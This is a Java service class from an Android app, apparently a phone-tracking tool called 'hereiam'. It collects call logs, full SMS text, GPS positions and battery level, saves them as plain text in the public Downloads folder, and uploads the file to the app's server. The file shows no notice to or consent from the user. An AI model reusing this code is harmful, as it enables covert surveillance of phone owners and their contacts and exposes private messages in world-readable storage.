package biz.prolike.hereiam.utils;


import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Environment;
import android.os.IBinder;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.koushikdutta.async.future.FutureCallback;
import com.koushikdutta.ion.Ion;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.util.List;

import biz.prolike.hereiam.containers.CallData;
import biz.prolike.hereiam.containers.LocData;
import biz.prolike.hereiam.containers.SMSData;

/**
 * Created by admin on 5/20/15.
 */
public class SendApi extends Service {

    private final Context mContext;
    private Intent inte;
    private String TAG = "- API -";
    DatabaseHandler db;
    String g;
    public SendApi(Context context) {
        this.mContext = context;
        //make();
    }


    @Override
    public IBinder onBind(Intent arg0) {
        this.inte = arg0;
        return null;
    }

    protected void make() {
        db = new DatabaseHandler(mContext);
        if(!isOnline(mContext))
        {
           // showToast("Nu este internet !!!");
        }
            else
        {
            SharedPreferences prefs = mContext.getSharedPreferences("biz.prolike.hereiam", mContext.MODE_PRIVATE);
            Integer id_user = Integer.parseInt(prefs.getString("id_user", ""));


           //showToast("Este internet: \nCalls "+db.getCount("contacts")+ " \nMessages: "+db.getCount("messages"));

            List<CallData> contacts = db.getCallstoPost();
            List<SMSData> smsData = db.getSMStoPost();
            List<LocData> locData = db.getLoctoPost();
            JSONObject callObj = null;
            JSONObject smsObj = null;
            JSONObject posObj = null;

            JSONArray callArray = new JSONArray();
            JSONArray smsArray  = new JSONArray();
            JSONArray locArray  = new JSONArray();




            for (CallData cn : contacts) {
                callObj = new JSONObject();
                try {
                    callObj.put("type", cn.getCalltype());
                    callObj.put("number", cn.getCallnumber());
                    callObj.put("date", cn.getCalldatetime());
                    callObj.put("duration", cn.getCallduration());
                    callObj.put("name", cn.getCallname());
                    callObj.put("id_user", id_user);

                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                callArray.put(callObj);

            }


            for (SMSData sms : smsData) {
                smsObj = new JSONObject();
                try {
                    smsObj.put("type",     sms.getType());
                    smsObj.put("number",   sms.getNumber());
                    smsObj.put("date",     sms.getDate());
                    smsObj.put("body",     sms.getBody());
                    smsObj.put("id_user",  id_user);

                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                smsArray.put(smsObj);

            }


            for (LocData loc : locData) {
                boolean ex = false;
                posObj = new JSONObject();
                try {
                    if(!loc.getLon().equals("0.0") || !loc.getLat().equals("0.0") ) {
                        posObj.put("lon", loc.getLon());
                        posObj.put("lat", loc.getLat());
                        posObj.put("date", loc.getDate());
                        posObj.put("id_user", id_user);
                        ex = true;
                    }

                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                if(ex) {
                    locArray.put(posObj);
                }

            }


            JSONObject finalobject = new JSONObject();
            try {
                finalobject.put("calls", callArray);
                finalobject.put("sms", smsArray);
                finalobject.put("loc", locArray);
            } catch (JSONException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            Gson gson = new Gson();
            g = gson.toJson(finalobject);
            //int level = inte.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = mContext.registerReceiver(null, ifilter);
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            String URL = Uri.parse(Config.URL_SITE + "/test")
                    .buildUpon()
                    .appendQueryParameter("post", g)
                    .appendQueryParameter("battery", String.valueOf(level))
                    .build().toString();


            try {
                File path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                File myFile = new File(path, "bizprolike.txt");
                //File myFile = new File("bizprolike.txt");
                myFile.createNewFile();
                FileOutputStream fOut = new FileOutputStream(myFile);
                OutputStreamWriter myOutWriter =new OutputStreamWriter(fOut);
                myOutWriter.append(g);
                myOutWriter.close();
                fOut.close();

                Ion.with(mContext)
                        .load(Config.URL_SITE + "/post")
                        .setMultipartFile("file", "text/plain", new File(path, "bizprolike.txt"))
                        .asJsonObject()
                        .setCallback(new FutureCallback<JsonObject>() {
                            @Override
                            public void onCompleted(Exception e, JsonObject result) {
                           //     showToast("MDAAAA");
                            }
                        });
            }
            catch (Exception e)
            {
                Toast.makeText(mContext, e.getMessage(),Toast.LENGTH_SHORT).show();
            }

            /*
            String tag_json_obj = "post_data_to_server";
            JsonObjectRequest jsObjRequest = new JsonObjectRequest(Request.Method.GET,URL,finalobject,
                    new Response.Listener<JSONObject>() {
                        @Override
                        public void onResponse(JSONObject response) {
                            try {
                                String info = response.getString("info");
                                if(info.equals("success"))
                                {
                                        showToast("Afisez doar cind datele sunt transmise");
                                        db.reset("contacts");
                                        db.reset("messages");
                                        db.reset("position");
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                                Toast.makeText(getApplicationContext(),
                                        "Error: " + e.getMessage(),
                                        Toast.LENGTH_LONG).show();
                            }
                        }
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            VolleyLog.d(TAG, "Error: " + error.getMessage());
                            VolleyLog.d(TAG, "Eroare: " + error.toString());
                        }
                    });

            AppController.getInstance().addToRequestQueue(jsObjRequest, tag_json_obj);
            */
            db.closeDB();
        }
    }

    public boolean isOnline(Context context) {

        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        //should check null because in air plan mode it will be null
        return (netInfo != null && netInfo.isConnected());

    }

    private void showToast(String text) {
        Toast.makeText(mContext, text, Toast.LENGTH_LONG).show();

    }


}
